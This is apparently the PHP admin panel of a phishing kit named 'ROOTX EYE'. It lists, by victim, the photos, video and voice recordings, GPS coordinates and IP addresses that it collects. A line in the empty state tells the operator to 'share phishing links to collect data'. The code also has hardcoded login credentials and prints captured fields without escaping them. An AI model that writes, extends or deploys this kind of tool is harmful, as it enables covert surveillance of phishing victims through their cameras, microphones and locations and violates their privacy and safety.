<?php
session_start();

$admin_user = 'rootx';
$admin_pass = 'rootx123';
$error = '';

if (isset($_POST['login'])) {
    if ($_POST['username'] == $admin_user && $_POST['password'] == $admin_pass) {
        $_SESSION['loggedin'] = true;
        header('Location: admin.php');
        exit;
    } else {
        $error = "❌ Invalid credentials!";
    }
}

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>ROOTX EYE Admin</title>
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body { background:#0a0a1a; font-family:'Segoe UI',sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; color:#fff; }
            .login-box { background:rgba(255,255,255,0.05); backdrop-filter:blur(10px); padding:40px; border-radius:20px; border:1px solid rgba(255,255,255,0.1); width:350px; text-align:center; }
            .login-box h1 { font-size:32px; background:linear-gradient(45deg,#ff0033,#ff0066); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
            .login-box input { width:100%; padding:12px; margin:8px 0; background:rgba(255,255,255,0.05); border:1px solid #333; border-radius:8px; color:#fff; }
            .login-box button { width:100%; padding:12px; background:linear-gradient(45deg,#ff0033,#ff0066); border:none; border-radius:8px; color:#fff; font-size:16px; font-weight:bold; cursor:pointer; }
            .login-box button:hover { transform:scale(1.02); }
            .login-box .error { color:#ff0033; margin-top:10px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>👁️ ROOTX EYE</h1>
            <div style="color:#666; font-size:14px; margin-bottom:25px;">Admin Panel Login</div>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login">🔐 Login</button>
            </form>
            <?php if ($error): ?>
                <div class="error"><?= $error ?></div>
            <?php endif; ?>
            <div style="color:#444; font-size:12px; margin-top:20px;">🔒 Secure Admin Access</div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

$data_dir = 'data/';
$captures_file = $data_dir . 'captures.json';
if (!is_dir($data_dir)) mkdir($data_dir, 0777, true);

// Load captures and group by user ID
$users = [];
if (file_exists($captures_file)) {
    $captures = json_decode(file_get_contents($captures_file), true) ?: [];
    foreach ($captures as $capture) {
        $user_id = $capture['id'] ?? 'unknown';
        if (!isset($users[$user_id])) {
            $users[$user_id] = [
                'id' => $user_id,
                'ip' => $capture['ip'] ?? 'N/A',
                'user_agent' => $capture['user_agent'] ?? 'N/A',
                'first_seen' => $capture['time'] ?? date('Y-m-d H:i:s'),
                'captures' => []
            ];
        }
        $users[$user_id]['captures'][] = $capture;
    }
}

// View single user
if (isset($_GET['view_user']) && isset($users[$_GET['view_user']])) {
    $user = $users[$_GET['view_user']];
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>User Data - ROOTX EYE</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body { background:#0a0a1a; font-family:'Segoe UI',sans-serif; color:#fff; padding:20px; }
            .container { max-width:1200px; margin:0 auto; }
            .header { background:linear-gradient(135deg,#1a0033,#33001a); padding:20px 30px; border-radius:15px; margin-bottom:30px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; }
            .header h1 { font-size:28px; background:linear-gradient(45deg,#ff0033,#ff0066); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
            .btn-back { background:#3498db; color:#fff; padding:8px 20px; border:none; border-radius:8px; cursor:pointer; text-decoration:none; font-weight:bold; }
            .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:20px; }
            .card { background:rgba(255,255,255,0.03); border-radius:14px; overflow:hidden; border:1px solid rgba(255,255,255,0.06); }
            .card .preview { width:100%; height:200px; background:#0d0d20; display:flex; justify-content:center; align-items:center; font-size:50px; overflow:hidden; position:relative; }
            .card .preview img, .card .preview video { width:100%; height:100%; object-fit:cover; }
            .card .info { padding:14px 16px; }
            .card .info .time { color:#666; font-size:12px; }
            .card .info .ip { color:#888; font-size:12px; }
            .card .actions { padding:10px 16px; background:rgba(255,255,255,0.02); display:flex; gap:10px; border-top:1px solid rgba(255,255,255,0.03); }
            .card .actions a { padding:5px 14px; border-radius:6px; text-decoration:none; font-size:12px; font-weight:500; transition:0.3s; }
            .card .actions a:hover { opacity:0.8; }
            .btn-download { background:#00b894; color:#fff; }
            .btn-delete { background:#e74c3c; color:#fff; }
            .empty { text-align:center; padding:60px 20px; color:#555; grid-column:1/-1; }
            .badge { display:inline-block; padding:2px 10px; border-radius:20px; font-size:10px; font-weight:bold; text-transform:uppercase; color:#fff; }
            .badge.photo { background:#00b894; }
            .badge.video { background:#9b59b6; }
            .badge.voice { background:#f39c12; }
            .badge.location { background:#3498db; }
            @media (max-width:600px) { .header { flex-direction:column; text-align:center; gap:15px; } .grid { grid-template-columns:1fr; } }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div>
                    <h1>👤 User: <?= htmlspecialchars($user['id']) ?></h1>
                    <div style="color:#666; font-size:13px;">🌐 IP: <?= htmlspecialchars($user['ip']) ?> | 📅 First seen: <?= htmlspecialchars($user['first_seen']) ?></div>
                </div>
                <a href="admin.php" class="btn-back">🔙 Back</a>
            </div>
            <div class="grid">
                <?php if (empty($user['captures'])): ?>
                    <div class="empty">No captures for this user.</div>
                <?php else: ?>
                    <?php foreach (array_reverse($user['captures']) as $index => $capture): ?>
                    <div class="card">
                        <div class="preview">
                            <?php if (($capture['type'] ?? '') == 'photo' && !empty($capture['file'])): ?>
                                <img src="<?= $capture['file'] ?>" alt="Photo">
                            <?php elseif (($capture['type'] ?? '') == 'video' && !empty($capture['file'])): ?>
                                <video src="<?= $capture['file'] ?>" muted></video>
                            <?php elseif (($capture['type'] ?? '') == 'voice' && !empty($capture['file'])): ?>
                                <div style="text-align:center; padding:20px;">
                                    <div style="font-size:50px;">🎤</div>
                                    <audio controls style="width:100%; margin-top:10px;">
                                        <source src="<?= $capture['file'] ?>" type="audio/mpeg">
                                    </audio>
                                </div>
                            <?php elseif (($capture['type'] ?? '') == 'location'): ?>
                                <div style="text-align:center; padding:20px;">
                                    <div style="font-size:40px;">📍</div>
                                    <div style="font-size:14px; color:#aaa; margin-top:10px;">
                                        Lat: <?= $capture['lat'] ?? 'N/A' ?><br>
                                        Lng: <?= $capture['lng'] ?? 'N/A' ?>
                                    </div>
                                    <a href="https://maps.google.com/?q=<?= $capture['lat'] ?? '' ?>,<?= $capture['lng'] ?? '' ?>" target="_blank" style="color:#3498db; font-size:12px;">🗺️ View Map</a>
                                </div>
                            <?php else: ?>
                                <span style="font-size:40px; color:#333;">❓</span>
                            <?php endif; ?>
                            <span class="badge <?= $capture['type'] ?? 'unknown' ?>" style="position:absolute;top:10px;right:10px;">
                                <?= $capture['type'] ?? 'Unknown' ?>
                            </span>
                        </div>
                        <div class="info">
                            <div class="time">🕐 <?= $capture['time'] ?? 'N/A' ?></div>
                            <div class="ip">🌐 IP: <?= $capture['ip'] ?? 'N/A' ?></div>
                        </div>
                        <div class="actions">
                            <?php if (($capture['type'] ?? '') != 'location' && !empty($capture['file'])): ?>
                                <a href="?download=<?= $index ?>&user=<?= $user['id'] ?>" class="btn-download">⬇️ Download</a>
                            <?php endif; ?>
                            <a href="?delete=<?= $index ?>&user=<?= $user['id'] ?>" class="btn-delete" onclick="return confirm('Delete this capture?')">🗑️ Delete</a>
                        </div>
                    </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Delete user data
if (isset($_GET['delete_user']) && isset($users[$_GET['delete_user']])) {
    $user_id = $_GET['delete_user'];
    foreach ($users[$user_id]['captures'] as $capture) {
        if (!empty($capture['file']) && file_exists($capture['file'])) {
            unlink($capture['file']);
        }
    }
    unset($users[$user_id]);
    $all_captures = [];
    foreach ($users as $u) {
        $all_captures = array_merge($all_captures, $u['captures']);
    }
    file_put_contents($captures_file, json_encode($all_captures, JSON_PRETTY_PRINT));
    header('Location: admin.php');
    exit;
}

// Delete single capture from user
if (isset($_GET['delete']) && isset($_GET['user']) && isset($users[$_GET['user']])) {
    $user_id = $_GET['user'];
    $index = $_GET['delete'];
    if (isset($users[$user_id]['captures'][$index])) {
        $capture = $users[$user_id]['captures'][$index];
        if (!empty($capture['file']) && file_exists($capture['file'])) {
            unlink($capture['file']);
        }
        unset($users[$user_id]['captures'][$index]);
        $users[$user_id]['captures'] = array_values($users[$user_id]['captures']);
        $all_captures = [];
        foreach ($users as $u) {
            $all_captures = array_merge($all_captures, $u['captures']);
        }
        file_put_contents($captures_file, json_encode($all_captures, JSON_PRETTY_PRINT));
        header("Location: admin.php?view_user=$user_id");
        exit;
    }
}

// Clear all data
if (isset($_GET['clear_all'])) {
    foreach ($users as $u) {
        foreach ($u['captures'] as $capture) {
            if (!empty($capture['file']) && file_exists($capture['file'])) {
                unlink($capture['file']);
            }
        }
    }
    file_put_contents($captures_file, json_encode([]));
    header('Location: admin.php');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ROOTX EYE Admin</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0a0a1a; font-family:'Segoe UI',sans-serif; color:#fff; padding:20px; min-height:100vh; }
        .container { max-width:1400px; margin:0 auto; }
        
        .header {
            background:linear-gradient(135deg,#1a0033,#33001a,#1a0033);
            padding:30px; border-radius:15px; margin-bottom:30px;
            display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap;
            border:1px solid rgba(255,0,102,0.2);
        }
        .header h1 { font-size:32px; background:linear-gradient(45deg,#ff0033,#ff0066); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .header .stats { background:rgba(255,255,255,0.05); padding:12px 25px; border-radius:12px; border:1px solid rgba(255,255,255,0.05); }
        .header .stats span { color:#ff0066; font-weight:bold; font-size:18px; }
        
        .filters { display:flex; gap:12px; margin-bottom:25px; flex-wrap:wrap; align-items:center; }
        .btn { padding:8px 20px; border:none; border-radius:8px; font-weight:600; cursor:pointer; transition:0.3s; font-size:13px; }
        .btn:hover { transform:scale(1.02); }
        .btn-refresh { background:#3498db; color:#fff; }
        .btn-clear { background:#e74c3c; color:#fff; }
        .btn-logout { background:#555; color:#fff; }
        
        .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(350px,1fr)); gap:20px; }
        
        .user-card {
            background:rgba(255,255,255,0.03);
            border-radius:14px; overflow:hidden;
            border:1px solid rgba(255,255,255,0.06);
            transition:0.3s;
        }
        .user-card:hover { transform:translateY(-5px); border-color:rgba(255,0,102,0.3); }
        
        .user-header {
            background:rgba(255,255,255,0.03);
            padding:14px 18px;
            border-bottom:1px solid rgba(255,255,255,0.05);
            display:flex; justify-content:space-between; align-items:center;
        }
        .user-header .user-id { font-size:14px; color:#ff0066; font-weight:bold; }
        .user-header .user-ip { font-size:12px; color:#666; }
        
        .user-body { padding:14px 18px; }
        .capture-item {
            display:flex; justify-content:space-between; align-items:center;
            padding:4px 0; border-bottom:1px solid rgba(255,255,255,0.03);
            font-size:13px;
        }
        .capture-item .type { display:inline-block; padding:2px 10px; border-radius:20px; font-size:10px; font-weight:bold; text-transform:uppercase; }
        .type.photo { background:#00b894; color:#fff; }
        .type.video { background:#9b59b6; color:#fff; }
        .type.voice { background:#f39c12; color:#fff; }
        .type.location { background:#3498db; color:#fff; }
        .capture-item .time { color:#666; font-size:11px; }
        
        .user-actions { padding:10px 18px; background:rgba(255,255,255,0.02); display:flex; gap:10px; flex-wrap:wrap; border-top:1px solid rgba(255,255,255,0.03); }
        .user-actions a { padding:5px 14px; border-radius:6px; text-decoration:none; font-size:12px; font-weight:500; transition:0.3s; }
        .user-actions a:hover { opacity:0.8; }
        .btn-view { background:#3498db; color:#fff; }
        .btn-delete-user { background:#e74c3c; color:#fff; }
        
        .empty { text-align:center; padding:80px 20px; color:#444; font-size:18px; grid-column:1/-1; }
        .empty .icon { font-size:70px; margin-bottom:15px; display:block; }
        
        @media (max-width:600px) {
            .header { flex-direction:column; text-align:center; gap:15px; }
            .grid { grid-template-columns:1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>
                <h1>👁️ ROOTX EYE</h1>
                <div style="color:#666; font-size:14px;">User-Wise Data Dashboard</div>
            </div>
            <div class="stats">
                <div><span><?= count($users) ?></span> Total Users</div>
                <div style="font-size:12px; color:#666; margin-top:4px;">
                    <?php 
                        $total_captures = 0;
                        foreach ($users as $u) $total_captures += count($u['captures']);
                    ?>
                    📦 <?= $total_captures ?> Captures
                </div>
            </div>
        </div>

        <div class="filters">
            <button class="btn btn-refresh" onclick="location.reload()">🔄 Refresh</button>
            <button class="btn btn-clear" onclick="if(confirm('⚠️ Delete ALL users data?')) location.href='?clear_all=1'">🗑️ Clear All</button>
            <button class="btn btn-logout" onclick="if(confirm('Logout?')) location.href='?logout=1'">🚪 Logout</button>
        </div>

        <div class="grid">
            <?php if (empty($users)): ?>
                <div class="empty">
                    <span class="icon">📭</span>
                    No data captured yet.<br>
                    <div style="color:#555; font-size:14px;">Share phishing links to collect data</div>
                </div>
            <?php else: ?>
                <?php foreach ($users as $user_id => $user): ?>
                <div class="user-card">
                    <div class="user-header">
                        <span class="user-id">👤 <?= htmlspecialchars($user_id) ?></span>
                        <span class="user-ip">🌐 <?= htmlspecialchars($user['ip']) ?></span>
                    </div>
                    <div class="user-body">
                        <div style="font-size:11px; color:#555; margin-bottom:8px;">
                            📅 First seen: <?= htmlspecialchars($user['first_seen']) ?>
                        </div>
                        <?php foreach (array_slice($user['captures'], -5) as $capture): ?>
                        <div class="capture-item">
                            <span class="type <?= $capture['type'] ?? 'unknown' ?>">
                                <?= $capture['type'] ?? 'Unknown' ?>
                            </span>
                            <span class="time"><?= $capture['time'] ?? 'N/A' ?></span>
                        </div>
                        <?php endforeach; ?>
                        <?php if (count($user['captures']) > 5): ?>
                            <div style="font-size:11px; color:#555; margin-top:4px;">+ <?= count($user['captures']) - 5 ?> more...</div>
                        <?php endif; ?>
                    </div>
                    <div class="user-actions">
                        <a href="?view_user=<?= $user_id ?>" class="btn-view">📂 View All Data</a>
                        <a href="?delete_user=<?= $user_id ?>" class="btn-delete-user" onclick="return confirm('Delete this user?')">🗑️ Delete User</a>
                    </div>
                </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
    </div>

    <script>
        setTimeout(() => location.reload(), 15000);
    </script>
</body>
</html>
